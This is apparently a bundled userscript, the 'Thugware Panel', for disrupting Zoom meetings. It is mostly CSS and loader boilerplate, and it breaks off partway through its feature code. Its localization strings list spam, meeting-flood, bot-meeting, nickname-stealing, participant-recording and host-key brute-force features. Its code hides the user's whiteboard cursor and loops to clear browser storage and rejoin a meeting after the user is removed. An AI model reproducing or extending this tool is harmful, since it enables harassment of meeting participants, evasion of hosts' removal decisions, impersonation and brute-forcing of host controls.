(() => {
    var e = {
        103: (e, t, n) => {
            "use strict";
            n.d(t, { A: () => s });
            var o = n(601),
                a = n.n(o),
                i = n(314),
                r = n.n(i)()(a());
            r.push([e.id, `
/* Стилі для навігації */
.nav-tabs {
    display: flex;
    background: var(--background-secondary);
    border-radius: 12px;
    margin: 10px 15px;
    overflow: hidden;
    border: 1px solid rgba(255, 255, 255, 0.1);
}

.nav-tab {
    flex: 1;
    padding: 12px 15px;
    border: none;
    background: transparent;
    color: var(--text-secondary);
    cursor: pointer;
    transition: all 0.3s ease;
    font-weight: 600;
    font-size: 13px;
    text-align: center;
    position: relative;
    overflow: hidden;
}

.nav-tab::before {
    content: '';
    position: absolute;
    bottom: 0;
    left: 50%;
    width: 0;
    height: 3px;
    background: var(--primary-color);
    transition: all 0.3s ease;
    transform: translateX(-50%);
}

.nav-tab.active {
    color: var(--text-primary);
    background: rgba(255, 255, 255, 0.05);
}

.nav-tab.active::before {
    width: 80%;
}

.nav-tab:hover:not(.active) {
    background: rgba(255, 255, 255, 0.02);
    color: var(--text-primary);
}

.tab-content {
    display: none;
    padding: 10px 0;
}

.tab-content.active {
    display: block;
}

/* Стилі для розділів */
.section-header {
    font-size: 14px;
    font-weight: 800;
    color: var(--primary-color);
    text-transform: uppercase;
    letter-spacing: 1px;
    margin: 15px 15px 8px 15px;
    padding: 8px 12px;
    background: linear-gradient(90deg, transparent, rgba(0, 255, 64, 0.1), transparent);
    border-radius: 8px;
    text-align: center;
    border: 1px solid rgba(0, 255, 64, 0.2);
    position: relative;
    overflow: hidden;
}

.section-header::before {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, transparent, rgba(0, 255, 64, 0.2), transparent);
    transition: left 0.5s ease;
}

.section-header:hover::before {
    left: 100%;
}

.section-divider {
    height: 2px;
    background: linear-gradient(90deg, transparent, var(--primary-color), transparent);
    margin: 10px 20px;
    border-radius: 1px;
    opacity: 0.6;
}

/* Misc стилі */
.misc-content {
    padding: 15px;
}

.language-selector, .theme-selector {
    margin-bottom: 20px;
}

.selector-title {
    font-size: 14px;
    font-weight: 700;
    color: var(--primary-color);
    margin-bottom: 10px;
}

.language-buttons, .theme-buttons {
    display: flex;
    gap: 10px;
    margin-bottom: 15px;
}

.lang-btn, .theme-btn {
    flex: 1;
    padding: 10px;
    border: 1px solid rgba(255, 255, 255, 0.2);
    background: var(--background-secondary);
    color: var(--text-primary);
    border-radius: 8px;
    cursor: pointer;
    transition: all 0.3s ease;
    font-size: 12px;
}

.lang-btn:hover, .theme-btn:hover {
    background: rgba(255, 255, 255, 0.1);
    transform: translateY(-2px);
}

.lang-btn.active, .theme-btn.active {
    background: var(--primary-color);
    color: #000;
    font-weight: 700;
}

/* Coming Soon стилі */
.coming-soon {
    text-align: center;
    padding: 40px 20px;
    color: var(--text-secondary);
}

.coming-soon-text {
    font-size: 18px;
    font-weight: 700;
    margin-bottom: 10px;
    color: var(--primary-color);
}

.coming-soon-subtext {
    font-size: 12px;
    opacity: 0.7;
}

/* Інфо стилі */
.info-content {
    padding: 20px;
    color: var(--text-secondary);
    line-height: 1.6;
}

.info-title {
    font-size: 16px;
    font-weight: 700;
    color: var(--primary-color);
    margin-bottom: 15px;
    text-align: center;
}

.info-text {
    font-size: 12px;
    margin-bottom: 12px;
}

.info-feature {
    background: rgba(255, 255, 255, 0.05);
    padding: 10px;
    border-radius: 8px;
    margin: 8px 0;
    border-left: 3px solid var(--primary-color);
}

:root {
  --primary-color: #aa00ff;
  --secondary-color: #7700cc;
  --danger-color: #ff00aa;
  --warning-color: #ff6600;
  --background-primary: #0a0a1a;
  --background-secondary: #1a0a2a;
  --background-tertiary: #2a1a3a;
  --text-primary: #ffffff;
  --text-secondary: #cccccc;
  --border-radius: 15px;
  --transition-speed: 0.3s;
}

/* Темы */
.theme-neon {
  --primary-color: #ff00ff;
  --secondary-color: #00ffff;
  --danger-color: #ffff00;
  --warning-color: #ff00ff;
  --background-primary: #0a0a0a;
  --background-secondary: #1a0a1a;
  --background-tertiary: #2a1a2a;
}

.theme-cyber {
  --primary-color: #00eeff;
  --secondary-color: #0066ff;
  --danger-color: #ff0066;
  --warning-color: #ffaa00;
  --background-primary: #0a0a1a;
  --background-secondary: #1a1a2a;
  --background-tertiary: #2a2a3a;
}

.theme-ocean {
  --primary-color: #00bfff;
  --secondary-color: #0080ff;
  --danger-color: #ff4500;
  --warning-color: #ffd700;
  --background-primary: #001f3f;
  --background-secondary: #003366;
  --background-tertiary: #004080;
}

/* Анимации */
@keyframes slideIn {
  from {
    opacity: 0;
    transform: translateX(-30px) scale(0.9) rotate(-2deg);
  }
  to {
    opacity: 1;
    transform: translateX(0) scale(1) rotate(0deg);
  }
}

@keyframes glowPulse {
  0%, 100% {
    box-shadow: 0 0 20px var(--primary-color);
  }
  50% {
    box-shadow: 0 0 40px var(--primary-color), 0 0 60px var(--primary-color);
  }
}

@keyframes float {
  0%, 100% {
    transform: translateY(0px);
  }
  50% {
    transform: translateY(-5px);
  }
}

@keyframes shimmer {
  0% {
    background-position: -1000px 0;
  }
  100% {
    background-position: 1000px 0;
  }
}

@keyframes ripple {
  0% {
    transform: scale(0);
    opacity: 1;
  }
  100% {
    transform: scale(4);
    opacity: 0;
  }
}

/* Базовые стили панели */
.Thugware-panel {
    position: fixed;
    width: 380px;
    overflow: hidden;
    height: 600px;
    border: 2px solid var(--primary-color);
    background: linear-gradient(135deg, var(--background-primary) 0%, var(--background-secondary) 50%, var(--background-primary) 100%);
    backdrop-filter: blur(15px) saturate(200%);
    color: var(--text-primary);
    box-shadow: 
        0 0 50px rgba(0, 255, 64, 0.4),
        0 0 100px rgba(0, 255, 64, 0.2),
        inset 0 1px 0 rgba(255, 255, 255, 0.1),
        inset 0 -1px 0 rgba(0, 0, 0, 0.5);
    border-radius: var(--border-radius);
    z-index: 999999;
    left: 100px;
    top: 100px;
    user-select: none;
    font-family: 'Segoe UI', system-ui, sans-serif;
    animation: slideIn 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
    transition: all var(--transition-speed) ease;
}

.Thugware-panel:hover {
    box-shadow: 
        0 0 60px rgba(0, 255, 64, 0.6),
        0 0 120px rgba(0, 255, 64, 0.3),
        inset 0 1px 0 rgba(255, 255, 255, 0.1),
        inset 0 -1px 0 rgba(0, 0, 0, 0.5);
    transform: translateY(-2px);
}

.Thugware-header {
    margin: 0;
    text-align: left;
    font-size: 28px;
    padding: 20px 20px;
    font-weight: 900;
    background: linear-gradient(45deg, var(--primary-color), var(--secondary-color), #00ff88);
    background-size: 300% 300%;
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    text-shadow: 0 0 40px rgba(0, 255, 64, 0.7);
    position: relative;
    letter-spacing: 1px;
    animation: shimmer 3s ease-in-out infinite;
    cursor: grab;
    display: flex;
    align-items: center;
}

.Thugware-header::before {
    content: '⚡';
    margin-right: 10px;
    animation: float 3s ease-in-out infinite;
}

.Thugware-header::after {
    content: '';
    position: absolute;
    bottom: 0;
    left: 20px;
    width: calc(100% - 40px);
    height: 3px;
    background: linear-gradient(90deg, var(--primary-color), var(--secondary-color), transparent);
    border-radius: 2px;
}

.Thugware-button {
    padding: 15px 20px;
    margin: 8px 15px;
    border: none;
    cursor: pointer;
    background: linear-gradient(135deg, var(--background-secondary) 0%, var(--background-tertiary) 100%);
    color: var(--text-primary);
    font-size: 14px;
    font-weight: 600;
    border-radius: 12px;
    transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
    position: relative;
    overflow: hidden;
    box-shadow: 
        0 4px 15px rgba(0, 0, 0, 0.4),
        inset 0 1px 0 rgba(255, 255, 255, 0.1),
        0 1px 3px rgba(0, 0, 0, 0.3);
    border: 1px solid rgba(255, 255, 255, 0.1);
    width: calc(100% - 30px);
    text-align: left;
    backdrop-filter: blur(10px);
}

.Thugware-button::before {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, transparent, rgba(0, 255, 64, 0.2), transparent);
    transition: left 0.6s ease;
}

.Thugware-button::after {
    content: '';
    position: absolute;
    top: 50%;
    left: 50%;
    width: 0;
    height: 0;
    background: rgba(255, 255, 255, 0.1);
    border-radius: 50%;
    transform: translate(-50%, -50%);
    transition: width 0.3s ease, height 0.3s ease;
}

.Thugware-button:hover::before {
    left: 100%;
}

.Thugware-button:hover::after {
    width: 300px;
    height: 300px;
}

.Thugware-button:hover {
    transform: translateY(-3px) scale(1.02);
    box-shadow: 
        0 8px 25px rgba(0, 255, 64, 0.3),
        0 0 0 2px rgba(0, 255, 64, 0.4),
        inset 0 1px 0 rgba(255, 255, 255, 0.2);
    background: linear-gradient(135deg, var(--background-tertiary) 0%, #3a3a3a 100%);
}

.Thugware-button:active {
    transform: translateY(0) scale(0.98);
    transition: all 0.1s ease;
}

.Thugware-button:active::after {
    animation: ripple 0.6s ease-out;
}

.Thugware-button.enabled {
    background: linear-gradient(135deg, var(--primary-color) 0%, var(--secondary-color) 100%);
    color: #000;
    font-weight: 800;
    box-shadow: 
        0 0 25px rgba(0, 255, 64, 0.6),
        inset 0 1px 0 rgba(255, 255, 255, 0.4),
        0 4px 15px rgba(0, 255, 64, 0.3);
    animation: glowPulse 2s ease-in-out infinite;
}

.Thugware-button.enabled::before {
    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
}

.Thugware-button-container {
    height: calc(100% - 120px);
    overflow-y: auto;
    padding: 10px 0;
    scrollbar-width: thin;
    scrollbar-color: var(--primary-color) var(--background-secondary);
}

.Thugware-button-container::-webkit-scrollbar {
    width: 8px;
}

.Thugware-button-container::-webkit-scrollbar-track {
    background: var(--background-secondary);
    border-radius: 4px;
}

.Thugware-button-container::-webkit-scrollbar-thumb {
    background: linear-gradient(180deg, var(--primary-color), var(--secondary-color));
    border-radius: 4px;
    border: 1px solid rgba(255, 255, 255, 0.1);
}

.Thugware-button-container::-webkit-scrollbar-thumb:hover {
    background: linear-gradient(180deg, var(--primary-color), #00ff88);
    box-shadow: 0 0 10px var(--primary-color);
}

.Thugware-toggle {
    position: fixed;
    top: 50px;
    left: 0;
    z-index: 1000000;
    background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
    border: none;
    color: #000;
    font-weight: 900;
    box-shadow: 0 0 30px rgba(0, 255, 64, 0.6);
    animation: float 3s ease-in-out infinite, glowPulse 2s ease-in-out infinite;
    transition: all 0.3s ease;
}

.Thugware-toggle:hover {
    background: linear-gradient(135deg, #00ff60, #00ee44);
    box-shadow: 0 0 40px rgba(0, 255, 64, 0.8);
    transform: scale(1.1);
}

.warning-text {
    font-size: 12px;
    color: var(--danger-color);
    text-align: center;
    margin: 15px;
    padding: 12px;
    background: rgba(255, 68, 68, 0.15);
    border-radius: 8px;
    border: 1px solid var(--danger-color);
    backdrop-filter: blur(10px);
    animation: glowPulse 3s ease-in-out infinite;
    box-shadow: 0 0 20px rgba(255, 68, 68, 0.3);
}

/* Стили для панели спама */
.spam-selection-panel {
    position: fixed;
    width: 400px;
    max-height: 700px;
    overflow-y: auto;
    border: 2px solid var(--danger-color);
    background: linear-gradient(135deg, var(--background-primary) 0%, var(--background-secondary) 50%, var(--background-primary) 100%);
    backdrop-filter: blur(15px) saturate(200%);
    color: var(--text-primary);
    box-shadow: 0 0 50px rgba(255, 68, 68, 0.4);
    border-radius: var(--border-radius);
    z-index: 1000000;
    left: 450px;
    top: 100px;
    user-select: none;
    font-family: 'Segoe UI', system-ui, sans-serif;
    animation: slideIn 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
}

.spam-selection-header {
    margin: 0;
    text-align: center;
    font-size: 24px;
    padding: 15px 20px;
    font-weight: 800;
    background: linear-gradient(45deg, var(--danger-color), #ff6666, var(--danger-color));
    background-size: 300% 300%;
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    text-shadow: 0 0 30px rgba(255, 68, 68, 0.5);
    position: relative;
    animation: shimmer 3s ease-in-out infinite;
    display: flex;
    align-items: center;
    justify-content: space-between;
}

.close-button {
    background: none;
    border: none;
    color: var(--text-primary);
    font-size: 20px;
    cursor: pointer;
    padding: 5px 10px;
    border-radius: 5px;
    transition: all 0.3s ease;
}

.close-button:hover {
    background: rgba(255, 255, 255, 0.1);
    transform: scale(1.1);
}

.spam-message-item {
    padding: 12px 15px;
    margin: 6px 12px;
    border: none;
    cursor: pointer;
    background: linear-gradient(135deg, var(--background-secondary) 0%, var(--background-tertiary) 100%);
    color: var(--text-primary);
    font-size: 13px;
    font-weight: 600;
    border-radius: 10px;
    transition: all 0.3s ease;
    position: relative;
    overflow: hidden;
    box-shadow: 0 3px 10px rgba(0, 0, 0, 0.3);
    border: 1px solid rgba(255, 255, 255, 0.1);
    width: calc(100% - 24px);
    text-align: left;
    word-wrap: break-word;
    white-space: normal;
    height: auto;
    min-height: 50px;
    display: flex;
    align-items: center;
    backdrop-filter: blur(10px);
}

.spam-message-item:hover {
    transform: translateY(-2px) scale(1.02);
    box-shadow: 0 6px 20px rgba(255, 68, 68, 0.3);
    background: linear-gradient(135deg, var(--background-tertiary) 0%, #3a2a2a 100%);
}

.spam-message-item.selected {
    background: linear-gradient(135deg, var(--danger-color) 0%, #cc3333 100%);
    color: #000;
    font-weight: 700;
    box-shadow: 0 0 20px rgba(255, 68, 68, 0.6);
    animation: glowPulse 2s ease-in-out infinite;
}

.spam-checkbox {
    margin-right: 12px;
    width: 18px;
    height: 18px;
    accent-color: var(--danger-color);
    transform: scale(1.2);
}

.spam-message-text {
    flex: 1;
    font-size: 12px;
    line-height: 1.3;
}

.spam-controls {
    padding: 15px;
    border-top: 1px solid rgba(255, 255, 255, 0.1);
    background: rgba(0, 0, 0, 0.4);
    position: sticky;
    bottom: 0;
    backdrop-filter: blur(15px);
}

.spam-control-input {
    width: 100%;
    padding: 10px;
    margin: 8px 0;
    background: var(--background-secondary);
    border: 1px solid rgba(255, 255, 255, 0.2);
    border-radius: 8px;
    color: var(--text-primary);
    font-size: 13px;
    transition: all 0.3s ease;
}

.spam-control-input:focus {
    outline: none;
    border-color: var(--danger-color);
    box-shadow: 0 0 10px rgba(255, 68, 68, 0.3);
}

.spam-control-label {
    font-size: 12px;
    color: var(--text-secondary);
    margin-bottom: 5px;
    display: block;
    font-weight: 600;
}

.spam-selection-actions {
    display: flex;
    gap: 8px;
    margin-top: 15px;
}

.spam-action-button {
    flex: 1;
    padding: 10px;
    border: none;
    border-radius: 8px;
    cursor: pointer;
    font-size: 12px;
    font-weight: 700;
    transition: all 0.3s ease;
}

.spam-action-button.primary {
    background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
    color: #000;
}

.spam-action-button.secondary {
    background: linear-gradient(135deg, #444, #666);
    color: #fff;
}

.spam-action-button.danger {
    background: linear-gradient(135deg, var(--danger-color), #cc3333);
    color: #000;
}

.spam-action-button:hover {
    transform: translateY(-2px);
    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.4);
}

.selected-count {
    font-size: 12px;
    color: var(--primary-color);
    text-align: center;
    margin: 8px 0;
    font-weight: 700;
}
`]);
            const s = r
        },
        314: e => {
            "use strict";
            e.exports = function (e) {
                var t = [];
                return t.toString = function () {
                    return this.map((function (t) {
                        var n = "", o = void 0 !== t[5];
                        return t[4] && (n += "@supports (".concat(t[4], ") {")), t[2] && (n += "@media ".concat(t[2], " {")), o && (n += "@layer".concat(t[5].length > 0 ? " ".concat(t[5]) : "", " {")), n += e(t), o && (n += "}"), t[2] && (n += "}"), t[4] && (n += "}"), n
                    })).join("")
                }, t.i = function (e, n, o, a, i) {
                    "string" == typeof e && (e = [[null, e, void 0]]);
                    var r = {};
                    if (o) for (var s = 0; s < this.length; s++) {
                        var d = this[s][0];
                        null != d && (r[d] = !0)
                    }
                    for (var l = 0; l < e.length; l++) {
                        var c = [].concat(e[l]);
                        o && r[c[0]] || (void 0 !== i && (void 0 === c[5] || (c[1] = "@layer".concat(c[5].length > 0 ? " ".concat(c[5]) : "", " {").concat(c[1], "}")), c[5] = i), n && (c[2] ? (c[1] = "@media ".concat(c[2], " {").concat(c[1], "}"), c[2] = n) : c[2] = n), a && (c[4] ? (c[1] = "@supports (".concat(c[4], ") {").concat(c[1], "}"), c[4] = a) : c[4] = "".concat(a)), t.push(c))
                    }
                }, t
            }
        },
        601: e => {
            "use strict";
            e.exports = function (e) {
                return e[1]
            }
        },
        72: e => {
            "use strict";
            var t = [];
            function n(e) {
                for (var n = -1, o = 0; o < t.length; o++) if (t[o].identifier === e) {
                    n = o;
                    break
                }
                return n
            }
            function o(e, o) {
                for (var i = {}, r = [], s = 0; s < e.length; s++) {
                    var d = e[s], l = o.base ? d[0] + o.base : d[0], c = i[l] || 0, u = "".concat(l, " ").concat(c);
                    i[l] = c + 1;
                    var p = n(u), h = { css: d[1], media: d[2], sourceMap: d[3], supports: d[4], layer: d[5] };
                    if (-1 !== p) t[p].references++, t[p].updater(h); else {
                        var m = a(h, o);
                        o.byIndex = s, t.splice(s, 0, { identifier: u, updater: m, references: 1 })
                    }
                    r.push(u)
                }
                return r
            }
            function a(e, t) {
                var n = t.domAPI(t);
                return n.update(e), function (t) {
                    if (t) {
                        if (t.css === e.css && t.media === e.media && t.sourceMap === e.sourceMap && t.supports === e.supports && t.layer === e.layer) return;
                        n.update(e = t)
                    } else n.remove()
                }
            }
            e.exports = function (e, a) {
                var i = o(e = e || [], a = a || {});
                return function (e) {
                    e = e || [];
                    for (var r = 0; r < i.length; r++) {
                        var s = n(i[r]);
                        t[s].references--
                    }
                    for (var d = o(e, a), l = 0; l < i.length; l++) {
                        var c = n(i[l]);
                        0 === t[c].references && (t[c].updater(), t.splice(c, 1))
                    }
                    i = d
                }
            }
        },
        659: e => {
            "use strict";
            var t = {};
            e.exports = function (e, n) {
                var o = function (e) {
                    if (void 0 === t[e]) {
                        var n = document.querySelector(e);
                        if (window.HTMLIFrameElement && n instanceof window.HTMLIFrameElement) try {
                            n = n.contentDocument.head
                        } catch (e) {
                            n = null
                        }
                        t[e] = n
                    }
                    return t[e]
                }(e);
                if (!o) throw new Error("Couldn't find a style target. This probably means that the value for the 'insert' parameter is invalid.");
                o.appendChild(n)
            }
        },
        540: e => {
            "use strict";
            e.exports = function (e) {
                var t = document.createElement("style");
                return e.setAttributes(t, e.attributes), e.insert(t, e.options), t
            }
        },
        56: (e, t, n) => {
            "use strict";
            e.exports = function (e) {
                var t = n.nc;
                t && e.setAttribute("nonce", t)
            }
        },
        825: e => {
            "use strict";
            e.exports = function (e) {
                if ("undefined" == typeof document) return { update: function () { }, remove: function () { } };
                var t = e.insertStyleElement(e);
                return {
                    update: function (n) {
                        !function (e, t, n) {
                            var o = "";
                            n.supports && (o += "@supports (".concat(n.supports, ") {")), n.media && (o += "@media ".concat(n.media, " {"));
                            var a = void 0 !== n.layer;
                            a && (o += "@layer".concat(n.layer.length > 0 ? " ".concat(n.layer) : "", " {")), o += n.css, a && (o += "}"), n.media && (o += "}"), n.supports && (o += "}");
                            var i = n.sourceMap;
                            i && "undefined" != typeof btoa && (o += "\n/*# sourceMappingURL=data:application/json;base64,".concat(btoa(unescape(encodeURIComponent(JSON.stringify(i)))), " */")), t.styleTagTransform(o, e, t.options)
                        }(t, e, n)
                    }, remove: function () {
                        !function (e) {
                            if (null === e.parentNode) return !1;
                            e.parentNode.removeChild(e)
                        }(t)
                    }
                }
            }
        },
        113: e => {
            "use strict";
            e.exports = function (e, t) {
                if (t.styleSheet) t.styleSheet.cssText = e; else {
                    for (; t.firstChild;) t.removeChild(t.firstChild);
                    t.appendChild(document.createTextNode(e))
                }
            }
        },
        384: () => {
            window.namesList = ["James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda", "William", "Elizabeth", "David", "Barbara", "Richard", "Susan", "Joseph", "Jessica", "Thomas", "Sarah", "Charles", "Karen", "Christopher", "Nancy", "Daniel", "Lisa", "Matthew", "Margaret", "Anthony", "Betty", "Donald", "Sandra", "Mark", "Ashley", "Paul", "Dorothy", "Steven", "Kimberly", "Andrew", "Emily", "Joshua", "Donna", "Kevin", "Michelle", "Brian", "Carol", "George", "Amanda", "Edward", "Melissa", "Ronald", "Deborah", "Samuel", "Helen", "Adam", "Natalie", "Diana", "Peter", "Victoria", "Henry", "Julia", "Ryan", "Alice", "Nathan", "Sophia", "Isaac", "Grace", "Zachary", "Chloe", "Jesse", "Megan", "Gabriel", "Ava", "Ethan", "Lily", "Lucas", "Scarlett", "Noah", "Emma", "Logan", "Hannah", "Aiden", "Samantha", "Isaiah", "Addison", "Caleb", "Nora", "Charles", "Katherine", "Luke", "Zoe", "Leo", "Aria", "Oliver", "Bella", "Jackson", "Aurora", "Jameson", "Madison", "Eli", "Piper", "Mason", "Sofia", "Carter", "Ellie", "Dylan", "Stella", "Sawyer", "Victoria", "Theodore", "Hazel", "Jordan", "Riley", "Wyatt", "Layla", "Hudson", "Maya", "Asher", "Sadie", "Anthony", "Aubrey", "Gavin", "Claire", "Adrian", "Luna", "Chase", "Eliana", "Jaxon", "Kinsley", "Colton", "Maddison", "Xander", "Camila", "Kai", "Serenity", "Liam", "Julia", "Quinn", "Vivian", "Ryder", "Sienna"];
            window.reactionList = ["🍆"];
        }
    }, t = {};
    function n(o) {
        var a = t[o];
        if (void 0 !== a) return a.exports;
        var i = t[o] = { id: o, exports: {} };
        return e[o](i, i.exports, n), i.exports
    }
    n.n = e => {
        var t = e && e.__esModule ? () => e.default : () => e;
        return n.d(t, { a: t }), t
    }, n.d = (e, t) => {
        for (var o in t) n.o(t, o) && !n.o(e, o) && Object.defineProperty(e, o, { enumerable: !0, get: t[o] })
    }, n.o = (e, t) => Object.prototype.hasOwnProperty.call(e, t), n.nc = void 0, (() => {
        "use strict";
        
        // Безопасная работа с localStorage
        const SafeStorage = {
            getItem(key) {
                try {
                    return localStorage.getItem(key);
                } catch (e) {
                    console.warn('localStorage недоступен:', e);
                    return null;
                }
            },
            
            setItem(key, value) {
                try {
                    localStorage.setItem(key, value);
                    return true;
                } catch (e) {
                    console.warn('Не удалось сохранить в localStorage:', e);
                    return false;
                }
            },
            
            removeItem(key) {
                try {
                    localStorage.removeItem(key);
                    return true;
                } catch (e) {
                    console.warn('Не удалось удалить из localStorage:', e);
                    return false;
                }
            },
            
            clear() {
                try {
                    localStorage.clear();
                    return true;
                } catch (e) {
                    console.warn('Не удалось очистить localStorage:', e);
                    return false;
                }
            }
        };

        // Система локализации
        const Localization = {
            currentLang: 'ru',
            
            translations: {
                ru: {
                    // Заголовки
                    panelTitle: "Custom By @linuxoidd",
                    participantsTitle: "Участники",
                    
                    // Вкладки
                    mainTab: "Главная",
                    cfgTab: "Настройки", 
                    miscTab: "Разное",
                    infoTab: "Инфо",
                    
                    // Разделы
                    mediaSection: "🎥 МЕДИА",
                    spamSection: "💬 СПАМ",
                    botsSection: "🤖 БОТЫ",
                    accountSection: "👤 АККАУНТ",
                    systemSection: "⚙️ СИСТЕМА",
                    adminSection: "🔐 АДМИНИСТРИРОВАНИЕ",
                    
                    // Кнопки
                    enableMic: "Включить микрофон",
                    enableCam: "Включить камеру",
                    recordUsers: "Запись участников",
                    spamHands: "Спам поднятием руки",
                    spamDef: "Спам деф",
                    spamReactions: "Спам реакциями",
                    spamNames: "Спам именами",
                    spamCustom: "Спам кастом",
                    spamAI: "Спам запросами ИИ",
                    spamScreenshare: "Спам запросами демонстрации",
                    botMeeting: "Бот встреча",
                    floodMeeting: "Флуд встречи",
                    stealName: "Кража ника",
                    autoReconnect: "Авто переподключение",
                    hideNotifications: "Скрыть уведомления",
                    hideReactions: "Скрыть реакции",
                    anonymousBoard: "Анонимная доска",
                    hostKeyBrute: "Подбор ключа хоста",
                    
                    // Misc
                    language: "Язык",
                    theme: "Тема",
                    russian: "Русский",
                    english: "Английский",
                    neon: "Неон",
                    cyber: "Киберпанк", 
                    ocean: "Океан",
                    
                    // Предупреждения
                    warning: ">>Develop: linuxoid<<",
                    useAtOwnRisk: "Используйте на свой страх и риск",
                    
                    // Инфо
                    infoTitle: "Информация о Thugware Panel",
                    features: [
                        "Продвинутое управление Zoom встречами",
                        "Множество режимов спама и опций",
                        "Система управления ботами",
                        "Манипуляция медиа в реальном времени",
                        "Настраиваемый интерфейс",
                        "Безопасно и анонимно"
                    ]
                },
                en: {
                    panelTitle: "Custom By @linuxoidd",
                    participantsTitle: "Participants",
                    
                    mainTab: "Main",
                    cfgTab: "Config",
                    miscTab: "Misc",
                    infoTab: "Info",
                    
                    mediaSection: "🎥 MEDIA",
                    spamSection: "💬 SPAM", 
                    botsSection: "🤖 BOTS",
                    accountSection: "👤 ACCOUNT",
                    systemSection: "⚙️ SYSTEM",
                    adminSection: "🔐 ADMINISTRATION",
                    
                    enableMic: "Enable Microphone",
                    enableCam: "Enable Camera",
                    recordUsers: "Record Participants",
                    spamHands: "Spam Raise Hand",
                    spamDef: "Spam Default",
                    spamReactions: "Spam Reactions",
                    spamNames: "Spam Names",
                    spamCustom: "Spam Custom",
                    spamAI: "Spam AI Requests",
                    spamScreenshare: "Spam Screenshare Requests",
                    botMeeting: "Bot Meeting",
                    floodMeeting: "Flood Meeting",
                    stealName: "Steal Nickname",
                    autoReconnect: "Auto Reconnect",
                    hideNotifications: "Hide Notifications",
                    hideReactions: "Hide Reactions",
                    anonymousBoard: "Anonymous Board",
                    hostKeyBrute: "Host Key Brute Force",
                    
                    language: "Language",
                    theme: "Theme",
                    russian: "Russian",
                    english: "English",
                    neon: "Neon",
                    cyber: "Cyberpunk",
                    ocean: "Ocean",
                    
                    warning: "Well Well Well",
                    useAtOwnRisk: "Use at your own risk",
                    
                    infoTitle: "Thugware Panel Information",
                    features: [
                        "Advanced Zoom meeting controls",
                        "Multiple spam modes and options",
                        "Bot management system", 
                        "Real-time media manipulation",
                        "Customizable interface",
                        "Secure and anonymous"
                    ]
                }
            },
            
            init() {
                this.loadLanguage();
            },
            
            setLanguage(lang) {
                if (this.translations[lang]) {
                    this.currentLang = lang;
                    SafeStorage.setItem('thugware-lang', lang);
                    this.updateUI();
                }
            },
            
            loadLanguage() {
                try {
                    const savedLang = SafeStorage.getItem('thugware-lang');
                    if (savedLang && this.translations[savedLang]) {
                        this.currentLang = savedLang;
                    }
                } catch (e) {
                    console.warn('Ошибка загрузки языка:', e);
                    this.currentLang = 'ru'; // fallback на русский
                }
            },
            
            t(key) {
                return this.translations[this.currentLang]?.[key] || key;
            },
            
            updateUI() {
                if (window.thugwarePanel && typeof window.thugwarePanel.updateLocalization === 'function') {
                    window.thugwarePanel.updateLocalization();
                }
            }
        };

        // Система тем
        const ThemeManager = {
            currentTheme: 'default',
            
            themes: {
                neon: {
                    name: 'neon',
                    class: 'theme-neon'
                },
                cyber: {
                    name: 'cyber', 
                    class: 'theme-cyber'
                },
                ocean: {
                    name: 'ocean',
                    class: 'theme-ocean'
                }
            },
            
            init() {
                this.loadTheme();
            },
            
            applyTheme(themeName) {
                try {
                    const theme = this.themes[themeName];
                    if (!theme) return;
                    
                    this.currentTheme = themeName;
                    
                    // Удаляем все классы тем
                    document.body.classList.remove('theme-neon', 'theme-cyber', 'theme-ocean');
                    
                    // Применяем выбранную тему
                    if (themeName !== 'default') {
                        document.body.classList.add(theme.class);
                    }
                    
                    SafeStorage.setItem('thugware-theme', this.currentTheme);
                } catch (e) {
                    console.warn('Ошибка применения темы:', e);
                }
            },
            
            loadTheme() {
                try {
                    const savedTheme = SafeStorage.getItem('thugware-theme');
                    if (savedTheme && this.themes[savedTheme]) {
                        this.applyTheme(savedTheme);
                    }
                } catch (e) {
                    console.warn('Ошибка загрузки темы:', e);
                }
            }
        };

        // Инициализация систем
        try {
            Localization.init();
            ThemeManager.init();
        } catch (e) {
            console.warn('Ошибка инициализации систем:', e);
        }

        // Основной код функций
        let e = null, t = null, o = !1;
        const a = function () {
            o = !o;
            let n = this.hooks.whiteboard, a = n.plugins.get("followPlugin");
            null == e && (e = n.publishCursor, n.publishCursor = () => {
                if (!o) return e.apply(n, arguments)
            }), null == t && (t = a.sendViewport, a.sendViewport = () => {
                if (!o) return t.apply(n, arguments)
            })
        };

        const i = function e() {
            let t = this;
            e.interval ? (clearInterval(e.interval), e.interval = void 0) : e.interval = setInterval((function () {
                const leaveButtons = Array.from(t.scope.document.querySelectorAll('button, [class*="button"], [role="button"]')).filter(btn => {
                    const text = btn.textContent?.trim().toLowerCase();
                    return text === 'выход' || text === 'exit' || 
                           text.includes('выход') || text.includes('exit');
                });

                const joinButtons = Array.from(t.scope.document.querySelectorAll('button, [class*="button"], [role="button"]')).filter(btn => {
                    const text = btn.textContent?.trim().toLowerCase();
                    return text === 'присоединиться' || text === 'войти' || text === 'join' || text === 'enter' ||
                           text.includes('присоединиться') || text.includes('войти') || text.includes('join') || text.includes('enter');
                });

                if (leaveButtons.length > 0) {
                    console.log('Обнаружена кнопка выхода, очищаем данные...');
                    SafeStorage.clear();
                    sessionStorage.clear();
                    t.scope.location.reload();
                    t.hooks.recache();
                }

                if (joinButtons.length > 0) {
                    console.log('Обнаружена кнопка присоединения, нажимаем...');
                    joinButtons[0].click();
                }

                const currentUrl = t.scope.location.href.toLowerCase();
                if (currentUrl.includes('exit') || currentUrl.includes('покинуть') || currentUrl.includes('выход')) {
                    console.log('Обнаружена страница выхода, перезагружаем...');
                    t.scope.location.href = window.meetingURL || t.scope.location.origin + t.scope.location.pathname;
                }

            }), 1000);
        };

        const autoMicrophone = function e() {
            let t = this;
            if (e.interval) {
                clearInterval(e.interval);
                e.interval = void 0;
                return;
            }
            e.interval = setInterval((function () {
                if (t.hooks.state.meeting.currentUser.muted) {
